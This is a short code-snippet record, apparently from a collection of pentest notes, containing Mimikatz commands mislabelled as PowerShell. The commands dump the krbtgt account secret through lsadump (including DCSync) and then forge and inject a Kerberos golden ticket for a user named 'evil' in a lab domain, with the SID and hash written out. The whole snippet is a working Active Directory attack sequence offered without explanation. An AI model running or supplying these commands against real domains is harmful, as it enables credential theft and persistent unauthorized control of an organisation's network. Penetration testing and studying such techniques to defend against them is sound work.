---
id: 695aa9bc-27ed-4544-89a0-272afe249e22
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.701284+00:00'
updated_at: '2023-04-10T20:26:19.929813+00:00'
---

# Code Snippet 695aa9bc

**Language**: Powershell

```powershell
# Get info - Mimikatz
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

# Forge a Golden ticket - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```


